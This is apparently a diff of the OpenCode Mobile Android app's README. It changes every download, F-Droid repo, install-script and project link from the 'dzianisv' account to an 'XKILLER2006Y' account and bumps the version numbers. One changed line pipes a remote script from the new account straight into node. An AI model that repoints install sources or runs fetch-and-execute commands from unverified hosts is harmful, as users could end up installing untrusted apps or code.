@@ -4,8 +4,8 @@
 AI-assisted coding from your phone — Android, via Google Play, F-Droid, or a direct APK.
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![F-Droid repo](https://img.shields.io/badge/F--Droid-add_our_repo-1976D2?logo=f-droid)](https://dzianisv.github.io/opencode-mobile/fdroid/repo)
-[![Download APK](https://img.shields.io/badge/Download-APK-green?logo=android)](https://github.com/dzianisv/opencode-mobile/releases/latest)
+[![F-Droid repo](https://img.shields.io/badge/F--Droid-add_our_repo-1976D2?logo=f-droid)](https://XKILLER2006Y.github.io/opencode-mobile/fdroid/repo)
+[![Download APK](https://img.shields.io/badge/Download-APK-green?logo=android)](https://github.com/XKILLER2006Y/opencode-mobile/releases/latest)
 [![Google Play](https://img.shields.io/badge/Google_Play-Available-4CAF50?logo=google-play)](https://play.google.com/store/apps/details?id=cc.agentlabs.opencode)
 
 > **Not affiliated with opencode.** OpenCode Mobile is an independent, community-built client and is
@@ -26,12 +26,12 @@ There are **three working ways** to install OpenCode Mobile today, all for Andro
 
 2. **F-Droid (self-hosted repo)** — add our self-hosted repo to any F-Droid client, then install/update from there:
    ```
-   https://dzianisv.github.io/opencode-mobile/fdroid/repo
+https://XKILLER2006Y.github.io/opencode-mobile/fdroid/repo
    ```
-   In the F-Droid app: **Settings → Repositories → + (add)** and paste the URL above. Current version: **v0.4.7**.
+   In the F-Droid app: **Settings → Repositories → + (add)** and paste the URL above. Current version: **v0.4.17**.
 
 3. **Direct signed APK** — download the latest release and install it manually:
-   **https://github.com/dzianisv/opencode-mobile/releases/latest**
+   **https://github.com/XKILLER2006Y/opencode-mobile/releases/latest**
 
 > iOS is not available (see [Roadmap](#roadmap)). IzzyOnDroid submission is pending.
 
@@ -65,13 +65,13 @@ OpenCode Mobile is a React Native / Expo app that brings the power of the [openc
 
 ## Get OpenCode Mobile
 
-Package: `cc.agentlabs.opencode` · Android only · current version v0.4.7
+Package: `cc.agentlabs.opencode` · Android only · current version v0.4.17
 
 | Channel | Status | How |
 |---|---|---|
 | **Google Play** | **Live** | [play.google.com/store/apps/details?id=cc.agentlabs.opencode](https://play.google.com/store/apps/details?id=cc.agentlabs.opencode) |
-| **F-Droid (self-hosted repo)** | **Live** | Add [`https://dzianisv.github.io/opencode-mobile/fdroid/repo`](https://dzianisv.github.io/opencode-mobile/fdroid/repo) in your F-Droid client |
-| **Direct APK** | **Live** | [github.com/dzianisv/opencode-mobile/releases/latest](https://github.com/dzianisv/opencode-mobile/releases/latest) |
+| **F-Droid (self-hosted repo)** | **Live** | Add [`https://XKILLER2006Y.github.io/opencode-mobile/fdroid/repo`](https://XKILLER2006Y.github.io/opencode-mobile/fdroid/repo) in your F-Droid client |
+| **Direct APK** | **Live** | [github.com/XKILLER2006Y/opencode-mobile/releases/latest](https://github.com/XKILLER2006Y/opencode-mobile/releases/latest) |
 | IzzyOnDroid | Submission pending | Not live yet |
 | Apple App Store / iOS | Not available | See [Roadmap](#roadmap) |
 
@@ -111,7 +111,7 @@ Enter the password you set in Step 1, tap **Connect**, and you're in.
 On your machine, open a terminal and run:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/dzianisv/opencode-mobile/main/scripts/opencode-remote/cli.mjs | node -- start
+curl -fsSL https://raw.githubusercontent.com/XKILLER2006Y/opencode-mobile/main/scripts/opencode-remote/cli.mjs | node -- start
 ```
 
 This starts (or reuses) your opencode server on port 4096, opens a Cloudflare
@@ -156,7 +156,7 @@ OpenCode Mobile is a thin client. It speaks the opencode HTTP + SSE API: listing
 
 ## Project Status
 
-**Current version: v0.4.12**
+**Current version: v0.4.17**
 
 | Feature | Status |
 |---|---|
@@ -197,7 +197,7 @@ Questions or private support: [support@agentlabs.cc](mailto:support@agentlabs.cc
 
 ## Roadmap
 
-Tracked on the [GitHub Projects board](https://github.com/dzianisv/opencode-mobile/projects) and in the [open milestones](https://github.com/dzianisv/opencode-mobile/milestones).
+Tracked on the [GitHub Projects board](https://github.com/XKILLER2006Y/opencode-mobile/projects) and in the [open milestones](https://github.com/XKILLER2006Y/opencode-mobile/milestones).
 
 Near-term priorities:
 - opencode Cloud one-tap connect + managed hosting
@@ -218,7 +218,7 @@ We welcome bug reports, feature requests, and pull requests. See [CONTRIBUTING.m
 
 OpenCode Mobile does not collect personal data. Optional Sentry crash reporting (opt-in, off by default) sends anonymised crash traces to Sentry. No analytics SDKs are bundled. Credentials are stored exclusively on-device in the OS keystore.
 
-Full privacy policy: [dzianisv.github.io/opencode-mobile/privacy](https://dzianisv.github.io/opencode-mobile/privacy/)
+Full privacy policy: [XKILLER2006Y.github.io/opencode-mobile/privacy](https://XKILLER2006Y.github.io/opencode-mobile/privacy/)
 
 ---
 
